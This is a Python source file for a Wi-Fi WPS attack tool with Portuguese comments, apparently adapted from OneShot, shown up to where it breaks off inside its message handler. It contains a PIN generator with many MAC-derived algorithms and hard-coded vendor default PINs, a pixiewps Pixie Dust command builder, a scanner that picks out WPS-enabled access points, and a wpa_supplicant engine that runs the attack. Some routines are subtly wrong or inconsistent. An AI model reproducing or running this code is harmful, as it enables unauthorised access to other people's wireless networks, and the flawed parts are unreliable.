#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
WPS Attack Pin Kali Linux & Windows WiFi Scanner
Apresenta uma suíte avançada de auditoria de segurança wireless para Linux e Windows.
"""

import sys
import subprocess
import os
import tempfile
import shutil
import re
import codecs
import socket
import pathlib
import time
import csv
import threading
import queue
import platform

from datetime import datetime
from pathlib import Path
from html import escape

try:
    import tkinter as tk
    from tkinter import ttk, messagebox, filedialog
except ImportError:
    sys.stderr.write(
        "Erro: tkinter não encontrado. "
        "Instale o Python com suporte a Tkinter/Tcl.\n"
    )
    sys.exit(1)

# Identificação do Sistema Operacional
OS_NAME = platform.system().lower()
IS_LINUX = OS_NAME == 'linux'
IS_WINDOWS = OS_NAME == 'windows'

# ============================================================
# CONSTANTES DE CORES - TEMA GREEN EDITION (TERMINAL HACKER)
# ============================================================
BG_MAIN = "#000000"
BG_PANEL = "#071007"
BG_ENTRY = "#091409"
GREEN_BRIGHT = "#00ff41"
GREEN_PRIMARY = "#00b82e"
GREEN_DIM = "#007a20"
GREEN_SELECT = "#123d18"
CYAN = "#00e5ff"
YELLOW = "#ffff00"
ORANGE = "#ff9900"
RED = "#ff3333"
TEXT_LIGHT = "#b8ffb8"

ANSI_RESET = '\033[0m'
ANSI_BOLD = '\033[1m'
ANSI_RED = '\033[91m'
ANSI_GREEN = '\033[92m'
ANSI_YELLOW = '\033[93m'
ANSI_BLUE = '\033[94m'
ANSI_MAGENTA = '\033[95m'
ANSI_CYAN = '\033[96m'
ANSI_WHITE = '\033[97m'

def colorize(text, color=ANSI_GREEN, bold=False):
    b = ANSI_BOLD if bold else ''
    return f'{b}{color}{text}{ANSI_RESET}'

# ============================================================
# CLASSES DE MANIPULAÇÃO DE ENDEREÇO MAC E REDE
# ============================================================
class NetworkAddress:
    def __init__(self, mac):
        if isinstance(mac, int):
            self._int_repr = mac
            self._str_repr = self._int2mac(mac)
        elif isinstance(mac, str):
            self._str_repr = mac.replace('-', ':').replace('.', ':').upper()
            self._int_repr = self._mac2int(mac)
        else:
            raise ValueError('MAC address deve ser uma string ou um inteiro')

    @property
    def string(self): return self._str_repr
    @string.setter
    def string(self, value):
        self._str_repr = value
        self._int_repr = self._mac2int(value)

    @property
    def integer(self): return self._int_repr
    @integer.setter
    def integer(self, value):
        self._int_repr = value
        self._str_repr = self._int2mac(value)

    def __int__(self): return self.integer
    def __str__(self): return self.string
    def __iadd__(self, other): self.integer += other; return self
    def __isub__(self, other): self.integer -= other; return self
    def __eq__(self, other): return self.integer == other.integer
    def __ne__(self, other): return self.integer != other.integer
    def __lt__(self, other): return self.integer < other.integer
    def __gt__(self, other): return self.integer > other.integer

    @staticmethod
    def _mac2int(mac): return int(mac.replace(':', ''), 16)
    @staticmethod
    def _int2mac(mac):
        mac = hex(mac).split('x')[-1].upper().zfill(12)
        return ':'.join(mac[i:i+2] for i in range(0, 12, 2))

    def __repr__(self):
        return f'NetworkAddress(string={self._str_repr}, integer={self._int_repr})'

# ============================================================
# GERADOR DE PIN WPS
# ============================================================
class WPSpin:
    def __init__(self):
        self.ALGO_MAC = 0
        self.ALGO_EMPTY = 1
        self.ALGO_STATIC = 2

        self.algos = {
            'pin24': {'name': '24-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin24},
            'pin28': {'name': '28-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin28},
            'pin32': {'name': '32-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin32},
            'pin36': {'name': '36-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin36},
            'pin40': {'name': '40-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin40},
            'pin44': {'name': '44-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin44},
            'pin48': {'name': '48-bit PIN', 'mode': self.ALGO_MAC, 'gen': self.pin48},

            'pinDLink': {'name': 'D-Link PIN', 'mode': self.ALGO_MAC, 'gen': self.pinDLink},
            'pinDLink1': {'name': 'D-Link PIN +1', 'mode': self.ALGO_MAC, 'gen': self.pinDLink1},
            'pinASUS': {'name': 'ASUS PIN', 'mode': self.ALGO_MAC, 'gen': self.pinASUS},
            'pinAirocon': {'name': 'Airocon Realtek', 'mode': self.ALGO_MAC, 'gen': self.pinAirocon},

            'pin24r': {'name': '24-bit PIN (reversed bytes)', 'mode': self.ALGO_MAC, 'gen': self.pin24r},
            'pin28r': {'name': '28-bit PIN (reversed bytes)', 'mode': self.ALGO_MAC, 'gen': self.pin28r},
            'pin32r': {'name': '32-bit PIN (reversed bytes)', 'mode': self.ALGO_MAC, 'gen': self.pin32r},
            'pin24rn': {'name': '24-bit PIN (reversed nibbles)', 'mode': self.ALGO_MAC, 'gen': self.pin24rn},
            'pin28rn': {'name': '28-bit PIN (reversed nibbles)', 'mode': self.ALGO_MAC, 'gen': self.pin28rn},
            'pin32rn': {'name': '32-bit PIN (reversed nibbles)', 'mode': self.ALGO_MAC, 'gen': self.pin32rn},
            'pin24rb': {'name': '24-bit PIN (reversed bits)', 'mode': self.ALGO_MAC, 'gen': self.pin24rb},

            'pinInvNIC': {'name': 'Inv NIC to PIN', 'mode': self.ALGO_MAC, 'gen': self.pinInvNIC},
            'pinNIC2': {'name': 'NIC * 2', 'mode': self.ALGO_MAC, 'gen': self.pinNIC2},
            'pinNIC3': {'name': 'NIC * 3', 'mode': self.ALGO_MAC, 'gen': self.pinNIC3},
            'pinOUIaddNIC': {'name': 'OUI + NIC', 'mode': self.ALGO_MAC, 'gen': self.pinOUIaddNIC},
            'pinOUIsubNIC': {'name': 'OUI - NIC', 'mode': self.ALGO_MAC, 'gen': self.pinOUIsubNIC},
            'pinOUIxorNIC': {'name': 'OUI ^ NIC', 'mode': self.ALGO_MAC, 'gen': self.pinOUIxorNIC},

            'pinHuawei': {'name': 'Huawei HG532x (ZAOMODE)', 'mode': self.ALGO_MAC, 'gen': self.pinHuawei},

            'pinCisco': {'name': 'Cisco', 'mode': self.ALGO_STATIC, 'gen': self.pinCisco},
            'pinBrcm1': {'name': 'Broadcom 1', 'mode': self.ALGO_STATIC, 'gen': self.pinBrcm1},
            'pinBrcm2': {'name': 'Broadcom 2', 'mode': self.ALGO_STATIC, 'gen': self.pinBrcm2},
            'pinBrcm3': {'name': 'Broadcom 3', 'mode': self.ALGO_STATIC, 'gen': self.pinBrcm3},
            'pinBrcm4': {'name': 'Broadcom 4', 'mode': self.ALGO_STATIC, 'gen': self.pinBrcm4},
            'pinBrcm5': {'name': 'Broadcom 5', 'mode': self.ALGO_STATIC, 'gen': self.pinBrcm5},
            'pinBrcm6': {'name': 'Broadcom 6', 'mode': self.ALGO_STATIC, 'gen': self.pinBrcm6},
            'pinAirc1': {'name': 'Airocon 1', 'mode': self.ALGO_STATIC, 'gen': self.pinAirc1},
            'pinAirc2': {'name': 'Airocon 2', 'mode': self.ALGO_STATIC, 'gen': self.pinAirc2},
            'pinDSL2740R': {'name': 'DSL-2740R', 'mode': self.ALGO_STATIC, 'gen': self.pinDSL2740R},
            'pinRealtek1': {'name': 'Realtek 1', 'mode': self.ALGO_STATIC, 'gen': self.pinRealtek1},
            'pinRealtek2': {'name': 'Realtek 2', 'mode': self.ALGO_STATIC, 'gen': self.pinRealtek2},
            'pinRealtek3': {'name': 'Realtek 3', 'mode': self.ALGO_STATIC, 'gen': self.pinRealtek3},
            'pinUpvel': {'name': 'Upvel', 'mode': self.ALGO_STATIC, 'gen': self.pinUpvel},
            'pinUR814AC': {'name': 'UR-814AC', 'mode': self.ALGO_STATIC, 'gen': self.pinUR814AC},
            'pinUR825AC': {'name': 'UR-825AC', 'mode': self.ALGO_STATIC, 'gen': self.pinUR825AC},
            'pinOnlime': {'name': 'Onlime', 'mode': self.ALGO_STATIC, 'gen': self.pinOnlime},
            'pinEdimax': {'name': 'Edimax', 'mode': self.ALGO_STATIC, 'gen': self.pinEdimax},
            'pinThomson': {'name': 'Thomson', 'mode': self.ALGO_STATIC, 'gen': self.pinThomson},
            'pinHG532x': {'name': 'HG532x', 'mode': self.ALGO_STATIC, 'gen': self.pinHG532x},
            'pinH108L': {'name': 'H108L', 'mode': self.ALGO_STATIC, 'gen': self.pinH108L},
            'pinTPLink': {'name': 'TP-Link (default 12345670)', 'mode': self.ALGO_STATIC, 'gen': self.pinTPLink},
            'pinFRITZ': {'name': 'FRITZ! Box', 'mode': self.ALGO_STATIC, 'gen': self.pinFRITZ},
            'pinNetgear': {'name': 'Netgear', 'mode': self.ALGO_STATIC, 'gen': self.pinNetgear},
            'pinSamsung': {'name': 'Samsung SWL', 'mode': self.ALGO_STATIC, 'gen': self.pinSamsung},
            'pinZyXEL': {'name': 'ZyXEL', 'mode': self.ALGO_STATIC, 'gen': self.pinZyXEL},
            'pinComtrend': {'name': 'Comtrend', 'mode': self.ALGO_STATIC, 'gen': self.pinComtrend},
            'pinZTE': {'name': 'ZTE H108L', 'mode': self.ALGO_STATIC, 'gen': self.pinZTE},
            'pinONO': {'name': 'CBN ONO', 'mode': self.ALGO_STATIC, 'gen': self.pinONO},
            
        }

    @staticmethod
    def checksum(pin):
        accum = 0
        pin = int(pin)
        while pin > 0:
            accum += (3 * (pin % 10))
            pin = int(pin / 10)
            accum += (pin % 10)
            pin = int(pin / 10)
        return (10 - accum % 10) % 10

    def generate(self, algo, mac):
        mac = NetworkAddress(mac)
        if algo not in self.algos:
            raise ValueError('Algoritmo de PIN WPS inválido')
        pin = self.algos[algo]['gen'](mac)
        if algo == 'pinEmpty':
            return pin
        pin = pin % 10000000
        pin = str(pin) + str(self.checksum(pin))
        return pin.zfill(8)

    # ==================== MÉTODOS DE CONSULTA ====================
    def getAll(self, mac, get_static=True):
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            item = {'id': ID}
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'PIN Estático — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getList(self, mac, get_static=True):
        res = []
        for ID, algo in self.algos.items():
            if algo['mode'] == self.ALGO_STATIC and not get_static:
                continue
            res.append(self.generate(ID, mac))
        return res

    def getSuggested(self, mac):
        algos = self._suggest(mac)
        res = []
        for ID in algos:
            algo = self.algos[ID]
            item = {'id': ID}
            if algo['mode'] == self.ALGO_STATIC:
                item['name'] = 'PIN Estático — ' + algo['name']
            else:
                item['name'] = algo['name']
            item['pin'] = self.generate(ID, mac)
            res.append(item)
        return res

    def getSuggestedList(self, mac):
        return [self.generate(algo, mac) for algo in self._suggest(mac)]

    def getLikely(self, mac):
        res = self.getSuggestedList(mac)
        return res[0] if res else None

    def _suggest(self, mac):
        mac = mac.replace(':', '').upper()
        algorithms = {
            'pin24': ('04BF6D', '0E5D4E', '107BEF', '14A9E3', '28285D', '2A285D', '32B2DC', '381766', '404A03', '4E5D4E', '5067F0', '5CF4AB', '6A285D', '8E5D4E', 'AA285D', 'B0B2DC', 'C86C87', 'CC5D4E', 'CE5D4E', 'EA285D', 'E243F6', 'EC43F6', 'EE43F6', 'F2B2DC', 'FCF528', 'FEF528', '4C9EFF', '0014D1', 'D8EB97', '1C7EE5', '84C9B2', 'FC7516', '14D64D', '9094E4', 'BCF685', 'C4A81D', '00664B', '087A4C', '14B968', '2008ED', '346BD3', '4CEDDE', '786A89', '88E3AB', 'D46E5C', 'E8CD2D', 'EC233D', 'ECCB30', 'F49FF3', '20CF30', '90E6BA', 'E0CB4E', 'D4BF7F4', 'F8C091', '001CDF', '002275', '08863B', '00B00C', '081075', 'C83A35', '0022F7', '001F1F', '00265B', '68B6CF', '788DF7', 'BC1401', '202BC1', '308730', '5C4CA9', '62233D', '623CE4', '623DFF', '6253D4', '62559C', '626BD3', '627D5E', '6296BF', '62A8E4', '62B686', '62C06F', '62C61F', '62C714', '62CBA8', '62CDBE', '62E87B', '6416F0', '6A1D67', '6A233D', '6A3DFF', '6A53D4', '6A559C', '6A6BD3', '6A7D5E', '6AA8E4', '6AC06F', '6AC61F', '6AC714', '6ACBA8', '6ACDBE', '6AD15E', '6AD167', '721D67', '72233D', '723CE4', '723DFF', '7253D4', '72559C', '726BD3', '727D5E', '7296BF', '72A8E4', '72C06F', '72C61F', '72C714', '72CBA8', '72CDBE', '72D15E', '72E87B', '0026CE', '9897D1', 'E04136', 'B246FC', 'E24136', '00E020', '5CA39D', 'D86CE9', 'DC7144', '801F02', 'E47CF9', '000CF6', '00A026', 'A0F3C1', '647002', 'B0487A', 'F81A67', 'F8D111', '34BA9A', 'B4944E'),
            'pin28': ('200BC7', '4846FB', 'D46AA8', 'F84ABF'),
            'pin32': ('000726', 'D8FEE3', 'FC8B97', '1062EB', '1C5F2B', '48EE0C', '802689', '908D78', 'E8CC18', '2CAB25', '10BF48', '14DAE9', '3085A9', '50465D', '5404A6', 'C86000', 'F46D04', '3085A9', '801F02'),
            'pinDLink': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'A0AB1B', 'B8A386', 'C0A0BB', 'CCB255', 'FC7516', '0014D1', 'D8EB97'),
            'pinDLink1': ('0018E7', '00195B', '001CF0', '001E58', '002191', '0022B0', '002401', '00265A', '14D64D', '1C7EE5', '340804', '5CD998', '84C9B2', 'B8A386', 'C8BE19', 'C8D3A3', 'CCB255', '0014D1'),
            'pinASUS': ('049226', '04D9F5', '08606E', '0862669', '107B44', '10BF48', '10C37B', '14DDA9', '1C872C', '1CB72C', '2C56DC', '2CFDA1', '305A3A', '382C4A', '38D547', '40167E', '50465D', '54A050', '6045CB', '60A44C', '704D7B', '74D02B', '7824AF', '88D7F6', '9C5C8E', 'AC220B', 'AC9E17', 'B06EBF', 'BCEE7B', 'C8FE007', 'D017C2', 'D850E6', 'E03F49', 'F0795978', 'F832E4', '00072624', '0008A1D3', '00177C', '001EA6', '00304FB', '00E04C0', '048D38', '081077', '081078', '081079', '083E5D', '10FEED3C', '181E78', '1C4419', '2420C7', '247F20', '2CAB25', '3085A98C', '3C1E04', '40F201', '44E9DD', '48EE0C', '5464D9', '54B80A', '587BE906', '60D1AA21', '64517E', '64D954', '6C198F', '6C7220', '6CFDB9', '78D99FD', '7C2664', '803F5DF6', '84A423', '88A6C6', '8C10D4', '8C882B00', '904D4A', '907282', '90F65290', '94FBB2', 'A01B29', 'A0F3C1E', 'A8F7E00', 'ACA213', 'B85510', 'B8EE0E', 'BC3400', 'BC9680', 'C891F9', 'D00ED90', 'D084B0', 'D8FEE3', 'E4BEED', 'E894F6F6', 'EC1A5971', 'EC4C4D', 'F42853', 'F43E61', 'F46BEF', 'F8AB05', 'FC8B97', '7062B8', '78542E', 'C0A0BB8C', 'C412F5', 'C4A81D', 'E8CC18', 'EC2280', 'F8E903F4'),
            'pinAirocon': ('0007262F', '000B2B4A', '000EF4E7', '001333B', '00177C', '001AEF', '00E04BB3', '02101801', '0810734', '08107710', '1013EE0', '2CAB25C7', '788C54', '803F5DF6', '94FBB2', 'BC9680', 'F43E61', 'FC8B97'),
            'pinEmpty': ('E46F13', 'EC2280', '58D56E', '1062EB', '10BEF5', '1C5F2B', '802689', 'A0AB1B', '74DADA', '9CD643', '68A0F6', '0C96BF', '20F3A3', 'ACE215', 'C8D15E', '000E8F', 'D42122', '3C9872', '788102', '7894B4', 'D460E3', 'E06066', '004A77', '2C957F', '64136C', '74A78E', '88D274', '702E22', '74B57E', '789682', '7C3953', '8C68C8', 'D476EA', '344DEA', '38D82F', '54BE53', '709F2D', '94A7B7', '981333', 'CAA366', 'D0608C'),
            'pinCisco': ('001A2B', '00248C', '002618', '344DEB', '7071BC', 'E06995', 'E0CB4E', '7054F5'),
            'pinBrcm1': ('ACF1DF', 'BCF685', 'C8D3A3', '988B5D', '001AA9', '14144B', 'EC6264'),
            'pinBrcm2': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19'),
            'pinBrcm3': ('14D64D', '1C7EE5', '28107B', 'B8A386', 'BCF685', 'C8BE19', '7C034C'),
            'pinBrcm4': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm5': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinBrcm6': ('14D64D', '1C7EE5', '28107B', '84C9B2', 'B8A386', 'BCF685', 'C8BE19', 'C8D3A3', 'CCB255', 'FC7516', '204E7F', '4C17EB', '18622C', '7C03D8', 'D86CE9'),
            'pinAirc1': ('181E78', '40F201', '44E9DD', 'D084B0'),
            'pinAirc2': ('84A423', '8C10D4', '88A6C6'),
            'pinDSL2740R': ('00265A', '1CBDB9', '340804', '5CD998', '84C9B2', 'FC7516'),
            'pinRealtek1': ('0014D1', '000C42', '000EE8'),
            'pinRealtek2': ('007263', 'E4BEED'),
            'pinRealtek3': ('08C6B3',),
            'pinUpvel': ('784476', 'D4BF7F0', 'F8C091'),
            'pinUR814AC': ('D4BF7F60',),
            'pinUR825AC': ('D4BF7F5',),
            'pinOnlime': ('D4BF7F', 'F8C091', '144D67', '784476', '0014D1'),
            'pinEdimax': ('801F02', '00E04C'),
            'pinThomson': ('002624', '4432C8', '88F7C7', 'CC03FA'),
            'pinHG532x': ('00664B', '086361', '087A4C', '0C96BF', '14B968', '2008ED', '2469A5', '346BD3', '786A89', '88E3AB', '9CC172', 'ACE215', 'D07AB5', 'CCA223', 'E8CD2D', 'F80113', 'F83DFF'),
            'pinH108L': ('4C09B4', '4CAC0A', '84742A4', '9CD24B', 'B075D5', 'C864C7', 'DC028E', 'FCC897'),
            'pinONO': ('5C353B', 'DC537C')
        }
        res = []
        for algo_id, masks in algorithms.items():
            if mac.startswith(masks):
                res.append(algo_id)
        return res

    def _get_clean_hex(self, mac):
        return mac.string.replace(':', '').replace('-', '').upper()

    # ==================== ALGORITMOS DE GERAÇÃO ====================
    def pin24(self, mac): return mac.integer & 0xFFFFFF
    def pin28(self, mac): return mac.integer & 0xFFFFFFF
    def pin32(self, mac): return mac.integer % 0x100000000
    def pin36(self, mac): return mac.integer & 0xFFFFFFFFF
    def pin40(self, mac): return mac.integer & 0xFFFFFFFFFF
    def pin44(self, mac): return mac.integer & 0xFFFFFFFFFFF
    def pin48(self, mac): return mac.integer & 0xFFFFFFFFFFFF

    def pinDLink(self, mac):
        nic = mac.integer & 0xFFFFFF
        pin = nic ^ 0x55AA55
        pin ^= (((pin & 0xF) << 4) + ((pin & 0xF) << 8) + ((pin & 0xF) << 12) + ((pin & 0xF) << 16) + ((pin & 0xF) << 20))
        pin %= int(10e6)
        if pin < int(10e5):
            pin += ((pin % 9) * int(10e5)) + int(10e5)
        return pin

    def pinDLink1(self, mac):
        temp_mac = NetworkAddress(mac.integer + 1)
        return self.pinDLink(temp_mac)

    def pinASUS(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ''
        for i in range(7):
            pin += str((b[i % 6] + b[5]) % (10 - (i + b[1] + b[2] + b[3] + b[4] + b[5]) % 7))
        return int(pin)

    def pinAirocon(self, mac):
        b = [int(i, 16) for i in mac.string.split(':')]
        pin = ((b[0] + b[1]) % 10) + (((b[5] + b[0]) % 10) * 10) + (((b[4] + b[5]) % 10) * 100) \
             + (((b[3] + b[4]) % 10) * 1000) + (((b[2] + b[3]) % 10) * 10000) \
             + (((b[1] + b[2]) % 10) * 100000) + (((b[0] + b[1]) % 10) * 1000000)
        return pin

    def pin24r(self, mac):
        clean = self._get_clean_hex(mac)
        return int(clean[::-1], 16) & 0xFFFFFF

    def pin28r(self, mac):
        clean = self._get_clean_hex(mac)
        return int(clean[::-1], 16) & 0xFFFFFFF

    def pin32r(self, mac):
        clean = self._get_clean_hex(mac)
        return int(clean[::-1], 16) & 0xFFFFFFFF

    def pin24rn(self, mac):
        clean = self._get_clean_hex(mac)
        return int(clean[::-1], 16) & 0xFFFFFF

    def pin28rn(self, mac):
        clean = self._get_clean_hex(mac)
        return int(clean[::-1], 16) & 0xFFFFFFF

    def pin32rn(self, mac):
        clean = self._get_clean_hex(mac)
        return int(clean[::-1], 16) & 0xFFFFFFFF

    def pin24rb(self, mac):
        clean = self._get_clean_hex(mac)
        reversed_bits = ''.join(reversed([bin(int(x, 16))[2:].zfill(4) for x in clean]))
        return int(reversed_bits, 2) & 0xFFFFFF

    def pinInvNIC(self, mac):
        clean = self._get_clean_hex(mac)
        return int(clean[::-1], 16) & 0xFFFFF

    def pinNIC2(self, mac):
        clean = self._get_clean_hex(mac)
        return (int(clean, 16) * 2) & 0xFFFFFFFF

    def pinNIC3(self, mac):
        clean = self._get_clean_hex(mac)
        return (int(clean, 16) * 3) & 0xFFFFFFFF

    def pinOUIaddNIC(self, mac):
        clean = self._get_clean_hex(mac)
        oui = int(clean[:6], 16)
        nic = int(clean[6:], 16)
        return (oui + nic) & 0xFFFFFFFF

    def pinOUIsubNIC(self, mac):
        clean = self._get_clean_hex(mac)
        oui = int(clean[:6], 16)
        nic = int(clean[6:], 16)
        return (oui - nic) & 0xFFFFFFFF

    def pinOUIxorNIC(self, mac):
        clean = self._get_clean_hex(mac)
        oui = int(clean[:6], 16)
        nic = int(clean[6:], 16)
        return (oui ^ nic) & 0xFFFFFFFF

    def pinHuawei(self, mac):
        return (mac.integer % 10000000) % 10000000

    def pinCisco(self, mac): return 1234567
    def pinBrcm1(self, mac): return 2017252
    def pinBrcm2(self, mac): return 4626484
    def pinBrcm3(self, mac): return 7622990
    def pinBrcm4(self, mac): return 6232714
    def pinBrcm5(self, mac): return 1086411
    def pinBrcm6(self, mac): return 3195719
    def pinAirc1(self, mac): return 3043203
    def pinAirc2(self, mac): return 7141225
    def pinDSL2740R(self, mac): return 6817554
    def pinRealtek1(self, mac): return 9566146
    def pinRealtek2(self, mac): return 9571911
    def pinRealtek3(self, mac): return 4856371
    def pinUpvel(self, mac): return 2085483
    def pinUR814AC(self, mac): return 4397768
    def pinUR825AC(self, mac): return 529417
    def pinOnlime(self, mac): return 9995604
    def pinEdimax(self, mac): return 3561153
    def pinThomson(self, mac): return 6795814
    def pinHG532x(self, mac): return 3425928
    def pinH108L(self, mac): return 9422988
    def pinTPLink(self, mac): return 12345670
    def pinFRITZ(self, mac): return 0
    def pinNetgear(self, mac): return 12345670
    def pinSamsung(self, mac): return 12345670
    def pinZyXEL(self, mac): return 11866428
    def pinComtrend(self, mac): return 18836486
    def pinZTE(self, mac): return 9422988
    def pinONO(self, mac): return 9575521
    

# ============================================================
# COMPANION DATA CLASSES (PIXIEWPS & CONFIGURATIONS)
# ============================================================
class PixiewpsData:
    def __init__(self):
        self.pke = self.pkr = self.e_hash1 = self.e_hash2 = self.authkey = self.e_nonce = ''
        
    def clear(self): 
        self.__init__()
        
    def got_all(self):
        return all([self.pke, self.pkr, self.e_nonce, self.authkey, self.e_hash1, self.e_hash2])
        
    def get_pixie_cmd(self, full_range=False):
        cmd = "pixiewps --pke {} --pkr {} --e-hash1 {} --e-hash2 {} --authkey {} --e-nonce {}".format(
            self.pke, self.pkr, self.e_hash1, self.e_hash2, self.authkey, self.e_nonce)
        if full_range: cmd += ' --force'
        return cmd

class ConnectionStatus:
    def __init__(self):
        self.status = ''
        self.last_m_message = 0
        self.essid = ''
        self.wpa_psk = ''
    def isFirstHalfValid(self): return self.last_m_message > 5
    def clear(self): self.__init__()

def get_hex(line):
    a = line.split(':', 3)
    return a[2].replace(' ', '').upper()

# ============================================================
# PARSER DE ESCANEAMENTO (LINUX - IWLIST/IW)
# ============================================================
class WiFiScanner:
    def __init__(self, interface, vuln_list=None, callback_log=None):
        self.interface = interface
        self.vuln_list = vuln_list or []
        self.callback_log = callback_log

    def log(self, msg, level='i'):
        if self.callback_log:
            self.callback_log(msg, level)

    def iw_scanner(self):
        cmd = 'iw dev {} scan'.format(self.interface)
        proc = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE,
                              stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        lines = proc.stdout.splitlines()
        networks = []
        for line in lines:
            if line.startswith('command failed:'):
                self.log('[IW ERROR] {}'.format(line), 'e')
                return []
            line = line.strip('\t')
            m = re.match(r'BSS (\S+)( )?\(on \w+\)', line)
            if m:
                networks.append({'BSSID': m.group(1).upper(), 'Security type': 'Unknown',
                                 'WPS': False, 'WPS locked': False, 'Model': '',
                                 'Model number': '', 'Device name': '', 'ESSID': '', 'Level': 0})
                continue
            if not networks: continue
            net = networks[-1]
            m = re.match(r'SSID: (.*)', line)
            if m:
                try:
                    net['ESSID'] = codecs.decode(m.group(1), 'unicode-escape').encode('latin1').decode('utf-8', errors='replace')
                except Exception:
                    net['ESSID'] = m.group(1)
                continue
            m = re.match(r'signal: ([+-]?([0-9]*[.])?[0-9]+) dBm', line)
            if m: net['Level'] = int(float(m.group(1))); continue
            m = re.match(r'(capability): (.+)', line)
            if m:
                net['Security type'] = 'WEP' if 'Privacy' in m.group(2) else 'Open'
                continue
            m = re.match(r'(RSN):\t [*] Version: (\d+)', line)
            if m:
                if net['Security type'] in ('WEP', 'Open'): net['Security type'] = 'WPA2'
                elif net['Security type'] == 'WPA': net['Security type'] = 'WPA/WPA2'
                continue
            m = re.match(r'(WPA):\t [*] Version: (\d+)', line)
            if m:
                if net['Security type'] in ('WEP', 'Open'): net['Security type'] = 'WPA'
                elif net['Security type'] == 'WPA2': net['Security type'] = 'WPA/WPA2'
                continue
            m = re.match(r'WPS:\t [*] Version: ((([0-9]*[.])?[0-9]+))', line)
            if m: net['WPS'] = True; continue
            m = re.match(r' [*] AP setup locked: (0x[0-9]+)', line)
            if m: net['WPS locked'] = int(m.group(1), 16) != 0; continue
            m = re.match(r' [*] Model: (.*)', line)
            if m: net['Model'] = m.group(1); continue
            m = re.match(r' [*] Model Number: (.*)', line)
            if m: net['Model number'] = m.group(1); continue
            m = re.match(r' [*] Device name: (.*)', line)
            if m: net['Device name'] = m.group(1); continue
        networks = [n for n in networks if n['WPS']]
        networks.sort(key=lambda x: x['Level'], reverse=True)
        return networks

    def scan(self):
        return self.iw_scanner()

# ============================================================
# COMPANION ENGINE (ATAQUE REAL WPS - LINUX)
# ============================================================
class Companion:
    def __init__(self, interface, callback_log=None, bssid=''):
        self.interface = interface
        self.callback_log = callback_log
        self._running = True
        if not IS_LINUX:
            self.log('Ataque WPS requer Linux com wpa_supplicant + pixiewps!', 'e')
            self._running = False
            return
        self.tempdir = tempfile.mkdtemp()
        with tempfile.NamedTemporaryFile(mode='w', suffix='.conf', delete=False) as temp:
            temp.write('ctrl_interface={}\nctrl_interface_group=root\nupdate_config=1\n'.format(self.tempdir))
            self.tempconf = temp.name
        self.wpas_ctrl_path = "{}/{}".format(self.tempdir, interface)
        self._init_wpa_supplicant()
        self.res_socket_file = "{}/{}".format(tempfile._get_default_tempdir(), next(tempfile._get_candidate_names()))
        self.retsock = socket.socket(socket.AF_UNIX, socket.SOCK_DGRAM)
        self.retsock.bind(self.res_socket_file)
        self.pixie_creds = PixiewpsData()
        self.connection_status = ConnectionStatus()
        user_home = str(pathlib.Path.home())
        self.sessions_dir = '{}/.OneShot/sessions/'.format(user_home)
        self.pixiewps_dir = '{}/.OneShot/pixiewps/'.format(user_home)
        self.reports_dir = os.path.dirname(os.path.realpath(__file__)) + '/reports/'
        for d in [self.sessions_dir, self.pixiewps_dir]:
            if not os.path.exists(d): os.makedirs(d)
        self.generator = WPSpin()
        self.bssid = bssid
        self.lastPwr = 0

    def stop(self): self._running = False

    def log(self, msg, level='i'):
        if self.callback_log: self.callback_log(msg, level)

    def _init_wpa_supplicant(self):
        if not self._running: return
        self.log('Iniciando wpa_supplicant em segundo plano...')
        cmd = 'wpa_supplicant -K -d -Dnl80211,wext,hostapd,wired -i{} -c{}'.format(self.interface, self.tempconf)
        self.wpas = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.STDOUT, encoding='utf-8', errors='replace')
        timeout_start = time.time()
        while self._running:
            ret = self.wpas.poll()
            if ret is not None and ret != 0:
                raise ValueError('wpa_supplicant terminou com erro: ' + self.wpas.communicate()[0])
            if os.path.exists(self.wpas_ctrl_path): break
            if time.time() - timeout_start > 15: raise TimeoutError('Estouro de tempo ao iniciar wpa_supplicant')
            time.sleep(.1)

    def sendOnly(self, command):
        if self._running: self.retsock.sendto(command.encode(), self.wpas_ctrl_path)

    def sendAndReceive(self, command):
        if not self._running: return ''
        self.retsock.sendto(command.encode(), self.wpas_ctrl_path)
        b, address = self.retsock.recvfrom(4096)
        return b.decode('utf-8', errors='replace')

    @staticmethod
    def _explain_wpas_not_ok_status(command, respond):
        if command.startswith(('WPS_REG', 'WPS_PBC')) and respond == 'UNKNOWN COMMAND':
            return 'wpa_supplicant compilado sem suporte WPS. Recompile com CONFIG_WPS=y.'
        return 'Erro interno do driver do wpa_supplicant'

    def _handle_wpas(self, pixiemode=False, pbc_mode=False, verbose=True, bssid=""):
        if not self._running: return False
        line = self.wpas.stdout.readline()
        if not line: self.wpas.wait(); return False
        line = line.rstrip('\n')
        if verbose: self.log(line, 'd')
        if line.startswith('WPS: '):
            if 'Building Message M' in line:
                try:
                    n = int(line.split('Building Message M')[1].replace('D', ''))
                    self.connection_status.last_m_message = n
                    self.log('Enviando WPS M{}...'.format(n))
                except (ValueError, IndexError): pass
            elif 'Received M' in line:
                try:
                    n = int(line.split('Received M')[1])
                    self.connection_status.last_m_message = n
                    self.log('Mensagem WPS M{} recebida'.format(n))
                    if n == 5: self.log('[!] 1º bloco (WPS 1st half) válido!', 's')
                except (ValueError, IndexError): pass
